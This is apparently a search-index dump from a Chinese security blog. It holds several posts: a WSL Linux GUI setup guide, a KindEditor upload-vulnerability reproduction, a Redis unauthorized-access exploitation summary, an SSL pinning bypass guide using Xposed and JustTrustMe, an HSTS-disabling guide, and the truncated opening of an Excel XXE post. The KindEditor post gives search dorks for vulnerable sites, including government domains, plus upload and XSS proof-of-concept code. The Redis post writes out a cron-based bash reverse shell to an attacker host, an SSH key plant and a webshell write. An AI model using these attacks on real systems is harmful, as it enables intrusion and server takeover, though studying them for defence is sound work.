save","link":"/2020/12/09/hexo%E8%BF%81%E7%A7%BB/"},{"title":"kali子系统GUI安装","text":"理论上讲，所有Win10的Linux子系统都可以通过Windows10本机远程桌面和Xming的方法来安装使用图形化界面，笔者目前只接触了Debian系的Linux系统，故以Debian GNU/Linux系统和xfce4为例介绍（Ubuntu系统装完Xming就能使用，在此不再叙述，详情请关注IT之家极客学院，同时本文也是为了方便一些有一定Linux使用经验朋友而写的，不喜勿喷）。另外，如果是Linux使用比较多的话，笔者推荐使用Debian系统，稳定性、依赖方面强过Ubuntu及Kali Linux等。 一、使用Windows10本机远程桌面连接1.1、首先安装好Debian具体过程不再叙述，参见IT之家Win10使用进阶：一周年更新14316如何开启Linux Bash命令行，安装好并设置密码之后如下： 1.2.使用国内软件源众所周知的原因，在国内如果使用官方源的话，更新软件、安装软件会非常的慢，非常痛苦，我们需要替换成国内软件源： 1、在win10资源管理器中打开C:\\Users\\username\\AppData\\Local\\Packages\\TheDebianProject.DebianGNULinux_76v4gfsz19hv4\\LocalState\\rootfs\\etc\\apt文件夹（将username替换为你自己的win10账户名）。 2、编辑sources.list文件，用#号注释掉原有的官方更新源，增加国内源。下面我贴出中科大比较稳定的stretch分支的源，软件比较老，但是稳定。然而我个人用的是buster分支，软件比较新，有些奇怪的事，Ubuntu默认用的很多软件的版本就比较新，所以系统稳定性要比Debian差些，求稳的同志们就用下面的源吧： deb https://mirrors.ustc.edu.cn/debian/ stretch main contrib non-free deb-src https://mirrors.ustc.edu.cn/debian/ stretch main contrib non-free deb https://mirrors.ustc.edu.cn/debian/ stretch-updates main contrib non-free deb-src https://mirrors.ustc.edu.cn/debian/ stretch-updates main contrib non-free deb https://mirrors.ustc.edu.cn/debian-security/ stretch/updates main contrib non-free deb-src https://mirrors.ustc.edu.cn/debian-security/ stretch/updates main contrib non-free 笔者在此也放出中科大大佬的工具，上面有常用的Linux发行版的国内源文件，已经设置好的，供各位下载：https://mirrors.ustc.edu.cn/repogen/ 3、编辑完保存，如图： 1.3.更新软件源代码：sudo apt-get update 注意：这里有个坑，因为是https协议的，但Win10的Debian子系统，并没有安装apt-transport-https，直接更新会报错，建议第一次更新先使用http协议或者官方源，在装完apt-transport-https之后，再使用1.2中https协议的软件源（Debian的buster以上分支也不需要，stable类的分支必须先安装apt-transport-https才能使用https协议的软件源，使用https协议可以有效防止运营商劫持）。 更新完如图： 1.4.安装xorgxorg是xfce桌面需要的一个基础依赖性质东西，开机时候提供登陆界面。这里我说的可能不太准确，个人理解就是要装xfce必须先安装xorg，不然使用起来会有些问题，比如缺少这个组件那个组件的，如果装Ubuntu桌面的话替换成kdm，xfce也可以先装xdm，看个人喜好。 代码：sudo apt-get install xorg 大约需要占用361M空间。 选择语言区域（建议选英文，选汉语也没用，就当学英语了），一路回车： 最后那行报错不用管，研究好些天都没解决掉，反正软件安装成功了。 1.5.安装xfce4代码：sudo apt-get install xfce4 大概需要441M空间，如果不换国内源的话怕是需要下载一天。 1.6.安装并配置xrdpXrdp允许Windows或Linux系统通过远程桌面的方式来访问另外一台主机，特别适合本地虚拟机使用，详情参考Linux公社文章：xrdp完美实现Windows远程访问Ubuntu 16.04。 1、安装xrdp，代码：sudo apt-get install xrdp 2、设置使用3390端口 代码：sudo sed -i ‘s/port=3389/port=3390/g’ /etc/xrdp/xrdp.ini 3、向xsession中写入xfce4-session 代码：sudo echo xfce4-session &gt;~/.xsession 4、重启xrdp服务，代码：sudo service xrdp restart 这时，可能会有防火墙提示，允许就好。 1.7.启动远程桌面 1、在Cortana中搜索远程桌面并启动： 2、点击显示选项，填入本机IP（这里是局域网IP，所以你也可以用局域网内其他Windows10电脑试试，建议使用静态ip）、刚刚设置的端口号、还有你的Linux子系统用户名（也可以使用root账户登陆，比较麻烦，因为Debian默认是禁止使用root账户登陆的），如图： 3、点击链接： 4、输入Linux子系统密码： 5、尽情享（shí）用吧： 1.7 中间的坑通过rdp连接，报错：failed to execute child process “dbus-launch” 解决： sudo service xrdp stopsudo apt-get install dbus-x11sudo service xrdp start 至于后面需要做的配置，参见：debian 9安装后需做的几件事。 二、使用Xming及ssh连接如果你用的Windows10子系统是Ubuntu，那安装完就能用了，很简单的详见IT之家相关教程，理论上所有Linux都可以通过本方法来实现安装，下面是Debian以及Kali Linux等系统需要做的配置，参考了：Use SSH and XMing to Display X Programs From a Linux Computer on a Windows Computer 首先需要安装Debian还有xfce4，与上面第一种方法述1.1至1.5的内容完全一致，在此不再赘述，安装好之后近些如下操作： 2.1.安装xming没什么特殊的，下载安装，打开就行。 地址：https://xming.en.softonic.com/?ex=REG-60.2 2.2.确定OpenSSH已经安装在终端执行：sudo apt-get install openssh-server 要是如下图这样，那就是没有安装，输入y确认就是了： 2.3.配置DISPLAY方法运行变量安装完xming之后你会发现并不能像Ubuntu一样运行DISPLAY=:0 startxfce4指令来启动Debian的应用程序，提示找不到DISPLAY方法，那是没有配置ssh相关内容，我们需要做如下配置： 1、打开${HOME}/.bashrc文档，在最后面加入： if [ -d “${HOME}/bin” ] ; then export? PATH=”${PATH}:${HOME}/bin” if [ -f “${HOME}/bin/ssh_login” ] ; then . “${HOME}/bin/ssh_login” fi fi 2、在${HOME}/bin/文件夹下新增ssh_login文件（bin文件夹没有就新建一个），内容如下： if [ -n “${SSH_CLIENT}” ] ; then if [ -z “${DISPLAY}” ] ; then export DISPLAY=’localhost:10’ fi fi 3、给ssh_login文件777权限，代码：sudo chmod 777 ${HOME}/bin/ssh_login 2.4.在终端中启动xfce4桌面如果你没有配置xming，没改里面东西，那默认实在0号显示器上显示Linux系统的程序，输入代码如下： DISPLAY=:0 startxfce4 也可以直接启动root账户： sudo su DISPLAY=:0 startxfce4 默认状态会只有两个比较简陋的panel，如下图： 你也可以再进行拖动调整，比如笔者上面是Windows10的任务栏，下面是Debian的panel，结合到一起美滋滋： 其实正常状态下，还会启动一个桌面进程的，由于我用的是buster分支的软件源，这就导致软件不是最稳定版本，然后desktop启动失败，于是就剩下这两个panel，然而因祸得福，个人感觉这样很舒服，所以保留了这种，如果你用了我上面写的源，启动后的将会和前面的远程桌面类似。 三、Win10远程桌面与Xming连接的对比其实实现原理都比较接近，都需要配置一系列东西，但两者体验还是有些不一样的，下面做个简要的对比： 1、安装难易度：个人感觉，就Debian来讲使用xming的方式安装稍微简单一些，但二者相差不多，如果是Ubuntu，那会更加简单，各位可以自行体验。 2、启动便携度：相同点是：两者都需要先在powershell或者cmd中先启动bash。 不同点是：远程桌面的方法启动bash后再启动远程桌面，只用配置一次，以后点击链接就可以，相当于每次启动需要鼠标点击一次powershell，输入bash，点击远程桌面，点击链接； xming的方法需要再启动xming，然后在powershell里输入DISPLAY=:0 starxfce4，但是终端都会记录以前输入的内容，所以也不用每次都输入，其实就我个人而言，xming的方法更加方便启（zhuang）动(bi)，哪怕每次都输入DISPLAY=:0 startxfce4。 使用远程桌面的方法启动后，可以关掉powershell了，只要后台服务在运行，就不会影响体验，但是xming不行，如果刚刚那个启动xfce4的powershell关掉，所有打开的窗口都会关闭。 3、使用体验：采用远程桌面连接的方式，将会有非常完整的沉浸式体验，你会获得一个完整而不割裂的Linux系统，如在电脑上单独安了一个完整的Linux体验： 而使用xming的方法，你会感觉两个系统合二为一了，有种混血儿的感觉，每一个Linux程序都将会开启一个xming窗口，而且这些窗口也支持win10的分屏功能： 4、资源占用情况：在启动系统只开一个文件管理器的情况下，使用远程桌面的方法资源占用稍多，个人猜测可能是远程桌面本身占用的资源稍多一些，另外说一下，两者是可以同时打开的： 5、与Windows10系统的互通性：文件互通性：两者都支持在两个系统下实时更改文件，但是都需要使用root账户登陆才能完全实现实时更改文档，不然在Windows10下的更改，在Linux下看不见，但在Linux下的更改立刻就能在Windows10上看到。 剪贴板互通性：两者都可以实现剪贴板文本内容的互通，但对于文件就有所不同。如使用远程桌面，文件的话由于两个系统的路径不同，无法从Windows10下粘贴文件到Linux下，如图： 但是可以从Linux下把文件粘贴到Windows10下的，比如粘贴到桌面，这是通过远程桌面本身实现的，如图： 而如果使用xming的话，只能文本互通，文件无法通过剪贴板复制粘贴，有时候还会有意外发生，需要清空剪贴板，比如笔者就在桌面上放了个 6、性能方面个人实际体验，xming方式的性能较差，比如使用Firefox的时候往往比较卡，这可能是实现方式不同的原因，尝试过提高xming优先级，也没多大用。 综上所述，如果希望有完整的沉浸式Linux体验，推荐使用远程桌面连接的方式，如果主要用的还是Windows10，希望使用Windows10的同时也使用Linux，那么笔者推荐使用xming的方式，这种方式可以将两个系统同时结合起来，从而获得很神奇的体验。在此再感谢下参考文献中的大神，有了他们的无私奉献，我们才能学到更多的知识。 参考文献：1、Win10使用进阶：一周年更新14316如何开启Linux Bash命令行 2、中科大Debian源使用帮助 3、使用xrdp实现windows远程桌面ubuntu linux 4、debian 9安装后需做的几件事 5、Use SSH and XMing to Display X Programs From a Linux Computer on a Windows Computer https://www.ithome.com/html/win10/353700.htm","link":"/2020/12/09/kali%E5%AD%90%E7%B3%BB%E7%BB%9FGUI%E5%AE%89%E8%A3%85/"},{"title":"kindeditor&lt;&#x3D;4.1.5上传漏洞复现","text":"0x00 漏洞描述漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.5编辑器中 这里html里面可以嵌套暗链接地址以及嵌套xss。Kindeditor上的uploadbutton.html用于文件上传功能页面，直接POST到/upload_json.*?dir=file，在允许上传的文件扩展名中包含htm,txt：extTable.Add(“file”,”doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2”) 0x01 批量搜索在google中批量搜索： 1234567891011inurl:/examples/uploadbutton.htmlinurl:/php/upload_json.phpinurl:/asp.net/upload_json.ashxinurl://jsp/upload_json.jspinurl://asp/upload_json.aspinurl:gov.cn/kindeditor/ 0x02 漏洞问题根本脚本语言自定义不同的上传地址，上传之前有必要验证文件 upload_json.* 的存在 1234567/asp/upload_json.asp/asp.net/upload_json.ashx/jsp/upload_json.jsp/php/upload_json.php 可目录变量查看是否存在那种脚本上传漏洞: 1234567kindeditor/asp/upload_json.asp?dir=filekindeditor/asp.net/upload_json.ashx?dir=filekindeditor/jsp/upload_json.jsp?dir=filekindeditor/php/upload_json.php?dir=file 0x03 漏洞利用google搜素一些存在的站点 inurl：kindeditor 1.查看版本信息http://www.xxx.org/kindeditor//kindeditor.js 2.版本是4.1.10可以进行尝试如下路径是否存在有必要验证文件 upload_json.*1234567kindeditor/asp/upload_json.asp?dir=filekindeditor/asp.net/upload_json.ashx?dir=filekindeditor/jsp/upload_json.jsp?dir=filekindeditor/php/upload_json.php?dir=file 3.如下图可以看出是存在jsp上传点:http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file 4.构造上传poc这里需要修改&lt;script&gt;...&lt;script&gt;以及url : 的内容,根据实际情况修改. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt;&lt;head&gt;&lt;title&gt;Uploader&lt;/title&gt;&lt;script src=&quot;http://www.xxx.org/kindeditor//kindeditor.js&quot;&gt;&lt;/script&gt;&lt;script&gt;KindEditor.ready(function(K) {var uploadbutton = K.uploadbutton({button : K('#uploadButton')[0],fieldName : 'imgFile',url : 'http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file',afterUpload : function(data) { if (data.error === 0) {var url = K.formatUrl(data.url, 'absolute');K('#url').val(url);}},});uploadbutton.fileBox.change(function(e) {uploadbutton.submit();});});&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;upload&quot;&gt;&lt;input class=&quot;ke-input-text&quot; type=&quot;text&quot; id=&quot;url&quot; value=&quot;&quot; readonly=&quot;readonly&quot; /&gt;&lt;input type=&quot;button&quot; id=&quot;uploadButton&quot; value=&quot;Upload&quot; /&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 简化版： 123456789&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file&quot; method=&quot;post&quot;&gt; Upload a new file:&lt;br&gt; &lt;input type=&quot;file&quot; name=&quot;imgFile&quot; size=&quot;50&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt; &lt;/form&gt; 其中的关键是imgFile参数，与js并无关系。 5.用浏览器打开,然后开启bupsuit进行拦截发送,可以看到成功上传txt文件 数据包： 12345678910111213141516171819POST /kindeditor/jsp/upload_json.jsp?dir=file HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------18467633426500Content-Length: 220Connection: closeCookie: JSESSIONID=E3C0B32A01F496F452C8B2C3BE609396; loginLogCookie=59e34572-c362-4953-92ce-d8181b860bc0Upgrade-Insecure-Requests: 1-----------------------------18467633426500Content-Disposition: form-data; name=&quot;imgFile&quot;; filename=&quot;xss.html&quot;Content-Type: text/html&lt;img src=q onerror=alert(111)&gt;-----------------------------18467633426500-- 返回如下： 访问：127.0.0.1/attached/file/20210104/20210104194243_465.html 0x04 漏洞修复1.直接删除upload_json.和file_manager_json. 2.升级kindeditor到最新版本 https://www.cnblogs.com/backlion/p/10421405.html","link":"/2021/01/04/kindeditor-4-1-5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"redis未授权访问漏洞利用总结","text":"0x01 redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。 Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。 如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。 0x02 漏洞利用靶机：CentOS6.5 CentOS安装redis：1234wget http://download.redis.io/releases/redis-3.2.0.tar.gztar xzf redis-3.2.0.tar.gzcd redis-3.2.0make 修改配置文件，使可以远程访问： 1vim redis.conf bind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server 1./src/redis-server redis-conf 默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。 ### 0x03 攻击测试 nmap扫描服务器开启端口#### 1.redis基本命令 连接redis： 1redis-cli -h 192.168.63.130 查看redis版本信息、一些具体信息、服务器版本信息等等： 1192.168.63.130:6379&gt;info 将变量x的值设为test： 1192.168.63.130:6379&gt;set x &quot;test&quot; 是把整个redis数据库删除，一般情况下不要用！！！ 1192.168.63.130:6379&gt;flushall 查看所有键： 1192.168.63.130:6379&gt;KEYS * 获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。 12192.168.63.130:6379&gt;CONFIG GET dir192.168.63.130:6379&gt;CONFIG GET dbfilename #### 2.攻击的几种方法 ##### (1).利用计划任务执行命令反弹shell 在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口 1nc -lvnp 7999 然后执行命令: 123456789root@kali:~# redis-cli -h 192.168.63.130192.168.63.130:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\\n&quot;OK192.168.63.130:6379&gt; config set dir /var/spool/cron/OK192.168.63.130:6379&gt; config set dbfilename rootOK192.168.63.130:6379&gt; saveOK 字段说明 nc监听端口已经反弹回来shell ps:此处使用bash反弹shell，也可使用其他方法反弹shell的几种姿势 写ssh-keygen公钥然后使用私钥登陆在以下条件下，可以利用此方法 Redis服务使用ROOT账号启动 服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。 首先在本地生成一对密钥： 1root@kali:~/.ssh# ssh-keygen -t rsa 然后redis执行命令： 12345678192.168.63.130:6379&gt; config set dir /root/.ssh/OK192.168.63.130:6379&gt; config set dbfilename authorized_keysOK192.168.63.130:6379&gt; set x &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\\n\\n\\n&quot;OK192.168.63.130:6379&gt; saveOK save后可以直接利用公钥登录ssh 往web物理路径写webshell当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell 执行以下命令 12345678192.168.63.130:6379&gt; config set dir /var/www/html/OK192.168.63.130:6379&gt; config set dbfilename shell.phpOK192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;OK192.168.63.130:6379&gt; saveOK 即可将shell写入web目录(web目录根据实际情况) 0x04 安全配置 限制登录ip 添加密码 修改默认端口 https://p0sec.net/index.php/archives/69/","link":"/2020/10/10/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},{"title":"使用Xposed+JustTrustMe来突破SSL Pinning","text":"0x00 前面如果你是一干Web安全的，当你在测试目前大多数的手机APP应用程序时，你一定遇到过burpsuite无法抓到数据包的情况，开始你以为只是https的问题，但是当你使用了burpsuite伪证书也无法抓取到时，你心里除了有句“MMP……”外，你一定也在思考这其中的蹊跷。 为什么https的网站使用伪证书可以抓到，而在app里面同样的方法就抓不到？答案是：app启用了SSL Pinning（又叫“ssl证书绑定“）. HTTPS的原理你必然懂，在建立ssl通道的过程中，当客户端向服务端发送了连接请求后，服务器会发送自己的证书(包括公钥、证书有效期、服务器信息等)给客户端，如果客户端是普通的浏览器，比如IE浏览器，则： 使用内置的CA证书去校验服务器证书是否被信任，如果不被信任，则会弹出https的告警提示信息，由用户自己决定是否要继续. 2、同样，用户也可以主动的将服务器证书导入到浏览器的受信任区，下次打开时该服务器证书将会自动被信任. 为啥中间人可以劫持https流量，以及在浏览器上我们为什么可以使用burp伪造证书，正是因为上面的2点，既： 1、 浏览器允许用户自行忽略证书告警，用户在无足够的信息安全意识时，可能会直接忽略刘浏览器的安全提示，在这篇文章的前2天以太坊钱包MyEtherWallet 就因为黑客使用“BGP流量劫持+HTTPS证书伪造“导致被干的鼻青脸肿. 2、浏览器允许“导入证书到浏览器信任区“这个操作让浏览器信任burp伪造的证书. 这种伪造证书的中间人攻击给HTTPS带来了很大的威胁。 0x01 SSLPinning了解一下如果能够这样做，是不是就可以解决这种“中间人劫持+伪造证书“攻击的问题： 客户端在收到服务器的证书后，对该证书进行强校验，验证该证书是不是客户端承认的证书，如果不是，则直接断开连接。 浏览器其实已经这样做了，但是如“前面”所说，选择权交给了用户，且浏览器由于其开放性允许让用户自导入自己的证书到受信任区域。 但是在APP里面就不一样，APP是HTTPS的服务提供方自己开发的客户端，开发者可以先将自己服务器的证书打包内置到自己的APP中，或者将证书签名内置到APP中，当客户端在请求服务器建立连接期间收到服务器证书后，先使用内置的证书信息校验一下服务器证书是否合法，如果不合法，直接断开。 当然攻击者也可以通过把这个APP源码给逆出来，然后找到证书校验这段逻辑，给他干掉，或者干脆把证书信息换成自己的服务器证书信息，然后重新打包签名，但是一旦APP做了代码加密和混淆，这个操作也会变得比较难搞。 因此这样看来，通过预先把服务器的证书信息“绑定“在APP的native端，然后建立连接时使用预先内置的绑定信息进行服务器证书校验,同时使用足够的代码加密或混淆，是比较合适的解决办法, 这个搞法就是“ssl pinning”. 补充： 不要将ssl pinning和https双向认证搞混了，HTTPS协议本身是支持双向认真的，既除了客户端对服务器证书进行验证外，服务器也可以要求客户端提供自己的证书信息并对其进行验证，在APP上，HTTPS双向认真的方案也可以防止中间人劫持，但这种双向认证开销较大，且安全性与”ssl pinning”一致，因此目前大多数APP都采用SSL Pinning这种方案。 0x02 使用Xposed + JustTruestMe来突破SSL pinning如果你逆向比较在行，你就自己逆源码，然后过加密混淆，然后干掉SSL pinning. 不过使用Xposed + JustTruestMe应该也不丢人。 Xposed是一个框架，它可以改变系统和应用程序的行为，而不接触任何APK。 它支持很多模块，每个模块可以用来帮助实现不同的功能。 JustTrustMe 是一个用来禁用、绕过 SSL 证书检查的基于 Xposed 模块。JustTrustMe 是将 APK 中所有用于校验 SSL 证书的 API 都进行了 Hook，从而绕过证书检查。 n 准备工作： 1、准备一个有root权限的andorid手机或者andorid模拟器 使用手机装Xposed容易变砖，刷来刷去，很麻烦。个人习惯也推荐直接用andorid模拟器，现在很多andorid模拟器长又好看，广告又少，各个是人才。 本文使用网易的MUMU模拟器，下载地址：http://mumu.163.com/baidu/ 对应的andorid版本为4.4。 2、 下载Xposed的apk安装包，下载地址： http://repo.xposed.info/module/de.robv.android.xposed.installer 在改页面找到点击下载即可，默认的版本支持Android 4.0.3 up to Android 4.4. 版本 Download: de.robv.android.xposed.installer_v33_36570c.apk (770.28 KB) 注意官方的说明，如果你的模拟器andorid版本为5.0以上，请按照如下说明操作： For Android 5.0 or higher (Lollipop/Marshmallow), these versions don’t work! Use this instead:http://forum.xda-developers.com/showthread.php?t=3034811 3、下载JustTrustMe模块 https://github.com/Fuzion24/JustTrustMe/releases/tag/v.2 注意下载 JustTrustMe.apk版本 ** 安装mumu模拟器** 双击安装即可，自己看着办，安装完开机，就是这个样子的： n 安装Xposed 点击MUMU主界面由下角的APK+图标，选择下载好的Xposed installer的apk包，即可开始安装，安装完成后，桌面会生成对应的图标，打开 第一次打开时，“框架”下面会有红色字体提示更新 不要管，点击框架，进去，点击“安装更新”，更新完成后，会提示重启，注意这个时候可能会卡死。 如果不卡死，说明你你比较厉害，点击下面的重启按钮重启。 如果卡死了，直接关闭模拟器，重新打开即可，再次进入框架页面，可以看到如下信息，则说明更新完成。 n 安装JustTrustMe 点击“模块”，此时还没有可用的模块， 同样的方法点击apk+导入之前下载好的JustTrustMe的apk安装包，系统会自动安装，安装完成后，在模块里面点击“软重启”，再次打开“模块”界面，即可看到JustTrustMe，勾选一下，启用这个模块： 到这里Xposed+JustTrustMe就安装和启动了。 接下来就是常规流程了： \\1. 在你的MUMU模拟器所在的宿主机上打开burpsuite，并启用代理，主要使用实际的IP地址作为监听地址 \\2. 给你的MUMU模拟器设置一个代理，因为MUMU模拟器做了很多裁剪，默认不提供wifi配置选项，这里可以下载一个wifi万能钥匙，然后通过它呼唤出wifi设置界面：打开wifi万能钥匙—未登录—设置—设置为wifi管理器—立即设置，即可看到如下选项，选择wlan,进入wifi设置选项 鼠标左键长安“WiredSSID”这个ssid名词，会弹出如下选项，选择修改网络，进入代理配置页面 把代理选项配置成burp监听的代理地址，保存即可。 到这里你一定会想，这个MUMU模拟器到底用的的是什么方式与你的宿主机进行通信的，你可以使用adb shell来看一下，adb是一个连接andorid的命令行工具，windows下的安装和使用请自行GOOGLE。Mac下的安装和使用： \\1. brew cask install android-platform-tools //安装adb工具 brew类似linux下的yum，不会用的自己google. 安装完成后，运行：adb shell 即可连接到mumu虚拟机 $ adb shell cancro:/ # cancro:/ # cancro:/ # 在这里可以使用大多数的linux命令，必然ls，vi等，查看IP地址使用：netcfg 通过查看ip地址以及ping命令测试，可以发现mumu虚拟机是通过127.0.0.1进行桥接到宿主机的，因此可以直接使用宿主机的IP地址进行代理。 \\3. Xposed+JustTrustMe只是解决了SSLpinning的问题，因为通讯本身是HTTPS的因此我们还是需要安装burp伪证书，直接导出burp的证书，因为默认格式是.cer的，andorid不支持，需要将这个证书先导入到浏览器在导出成.pem(x509)格式，然后在MUMU模拟器的设置—安全—从SD卡安装证书，通过MUMU的提供的共享文件夹将证书选择到安装即可，中间需要提示开启PIN码认真，开启一下即可。 到这里，你必然可以抓到启用了SSL pinning的APP的HTTPS的数据包了。 https://bbs.pediy.com/thread-226435.htm","link":"/2020/10/13/%E4%BD%BF%E7%94%A8Xposed-JustTrustMe%E6%9D%A5%E7%AA%81%E7%A0%B4SSL-Pinning/"},{"title":"关闭常见浏览器的HSTS功能","text":"HSTS简介​ HSTS代表的是HTTPS严格传输安全协议，它是一个网络安全政策机制，能够强迫浏览器只通过安全的HTTPS连接（永远不能通过HTTP）与网站交互。这能够帮助防止协议降级攻击和cookie劫持。 ​ HSTS最初是为了响应Moxie Marlinspike在2009 BlackHat Federal（2009年黑帽安全大会）上进行的题为“实践中击败SSL的新技巧”的演讲中所提出的一个漏洞而创建的。HSTS所防御的特定漏洞就是利用的是Marlinspike发布的一款叫做SSLStrip的工具。 ​ 本质上，这个工具是通过将安全的HTTPS连接转换回不安全的HTTP连接来工作的。通过告知浏览器应当使用HTTPS连接，HSTS能够修复这一问题。HSTS还能帮助避免Firesheep等常见工具窃取基于cookie的登录凭证。 ​ 不幸的是，部分HSTS设置可能会不经意地造成浏览器错误。例如，如果你使用的是Chrome，你可能就会遇到： “隐私错误：你的连接不是私人的”（NET::ERR_CERT_AUTHORITY_INVALID）。 在安装配置 SSL 证书时，可以使用一种能使数据传输更加安全的Web安全协议，即在服务器端上开启HSTS (HTTP Strict Transport Security)。它告诉浏览器只能通过HTTPS访问，而绝对禁止HTTP方式。 HTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers. 但是，在日常开发的过程中，有时我们会想测试页面在 HTTP 连接中的表现情况，这时 HSTS 的存在会让调试不能方便的进行下去。而且由于 HSTS 并不是像 cookie 一样存放在浏览器缓存里，简单的清空浏览器缓存操作并没有什么效果，页面依然通过 HTTPS 的方式传输。那么怎样才能关闭浏览器的 HSTS 呢，各种谷歌度娘之后，在这里汇总一下几大常见浏览器 HSTS 的关闭方法。 Safari 浏览器 完全关闭 Safari 删除 ~/Library/Cookies/HSTS.plist 这个文件 重新打开 Safari 即可 极少数情况下，需要重启系统 Chrome 浏览器 地址栏中输入 chrome://net-internals/#hsts 在 Delete domain 中输入项目的域名，并Delete 删除 可以在 Query domain 测试是否删除成功 PS：chrome://net-internals/#hsts是Chrome用来管理你的浏览器的本地HSTS设置的UI Opera 浏览器和 Chrome 方法一样 Firefox 浏览器方法一： 关闭所有已打开的页面 清空历史记录和缓存 地址栏输入about:permissions 搜索项目域名，并点击 Forget About This Site 方法二： 关闭Firefox中所有打开的标签。 利用键盘快捷键Ctrl + Shift + H（Mac上为Cmd + Shift + H）打开完整的历史窗口。在以下步骤中，你必须使用到这一窗口或侧边栏。 找到你想要为之删除HSTS设置的网站——如果需要，你可以在右上角搜索该网站。 从项目列表中右键点击该网站，并点击忘记这个网站。这将会清除这个域名的HSTS设置（以及其他缓存数据）。 重启Firefox并访问该网站。你现在应当能够通过HTTP/中断的HTTPS访问这一网站了。如果这些说明行不通，那么你可以尝试以下手动方式： 方法三： 首先，通过你的操作系统的文件资源管理器来定位你的Firefox配置文件。你可以通过导航到about:support来找到Firefox的这一文件夹。 向下滚动到页面中部，在应用程序基本要素部分，你将看到配置文件夹。点击打开文件夹。 现在关闭Firefox，因此浏览器便不会覆盖我们将要进行修改的任何设置。 在你的配置文件夹中，找到并打开文件SiteSecurityServiceState.txt。该文件包含了你之前访问的域名的HSTS和HPKP（Key Pinning，一种独立的HTTPS机制）缓存设置。 搜索你想要为之清除HSTS设置的域名，并将它从文件中删除。每个条目都有域名。删除从想要的域名开始到下一个列出的域名中的所有的条目。还有一种方法，你可以将现有文件从a .txt重命名为a .bak（为了保存现有的文件，以防万一）并允许Firefox在下次启动时创建一个全新的文件。 以下是一个简单的HSTS列表示例。 www.thesslstore.com:HSTS 0 17312 1527362896190,1,0 https://www.racent.com/blog/clear-hsts-settings-chrome-firefox https://kebingzao.com/2020/05/25/header-hsts/ https://iamkun.com/node/51","link":"/2021/01/23/%E5%85%B3%E9%97%AD%E5%B8%B8%E8%A7%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84HSTS%E5%8A%9F%E8%83%BD/"},{"title":"利用EXCEL进行XXE攻击","text":"0x00 前言XML外部实体攻击非常常见，特别是通过基于HTTP的API，我们经常遇到并利用以此通常获得对客户端环境的特权访问。不常见的是用Excel进行XXE攻击。 0x01 这是什么方式实际上，与所有post-Office 2007文件格式一样，现代Excel文件实际上只是XML文档的zip文件。这称为Office Open XML格式或OOXML。许多应用程序允许上传文件。有些处理内部数据并采取相应的操作，这几乎肯定需要解析XML。如果解析器未安全配置，则XXE几乎是不可避免的。在这篇文章中，我专注于Excel只是因为处理Excel文件比使用Word文档或Powerpoint更常见，但它肯定并不罕见，本文中的任何内容都可能适用于这些应用程序。 0x02 